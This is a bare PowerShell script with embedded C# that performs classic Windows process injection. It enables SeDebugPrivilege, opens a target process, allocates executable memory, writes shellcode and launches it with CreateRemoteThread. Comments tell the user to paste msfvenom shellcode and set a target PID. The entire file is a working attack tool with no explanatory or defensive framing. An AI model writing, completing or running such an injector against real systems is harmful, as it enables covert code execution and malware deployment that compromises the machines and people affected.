$code = @'
using System;
using System.Runtime.InteropServices;

public class Inject {
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr h, int access, ref IntPtr htok);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] buf, uint size, ref uint written);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr sa, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, ref uint threadId);

    [StructLayout(LayoutKind.Sequential, Pack=1)]
    struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }

    public static void Run(int pid, byte[] shellcode) {
        IntPtr htok = IntPtr.Zero;
        OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x28, ref htok);
        TokPriv1Luid tp = new TokPriv1Luid(); tp.Count = 1; tp.Attr = 2;
        LookupPrivilegeValue(null, "SeDebugPrivilege", ref tp.Luid);
        bool res = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        Console.WriteLine("[*] SeDebugPrivilege enabled: " + res);

        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
        if (hProc == IntPtr.Zero) { Console.WriteLine("[-] OpenProcess failed: " + Marshal.GetLastWin32Error()); return; }
        Console.WriteLine("[+] Opened process " + pid);

        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) { Console.WriteLine("[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error()); return; }
        Console.WriteLine("[+] Memory allocated at: " + addr.ToString("X"));

        uint written = 0;
        bool w = WriteProcessMemory(hProc, addr, shellcode, (uint)shellcode.Length, ref written);
        Console.WriteLine("[+] Shellcode written: " + w + " (" + written + " bytes)");

        uint threadId = 0;
        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, ref threadId);
        if (hThread == IntPtr.Zero) { Console.WriteLine("[-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error()); return; }
        Console.WriteLine("[+] Remote thread created! TID: " + threadId);
    }
}
'@



Add-Type $code

[byte[]]$sc = 0xfc,0x48,0x83,0xe4 # PASTE MSFVENOM SHELLCODE HERE

$targetPid = 624 # REPLACE WITH TARGET PID
Write-Host "[*] Target PID: $targetPid"
[Inject]::Run($targetPid, $sc)





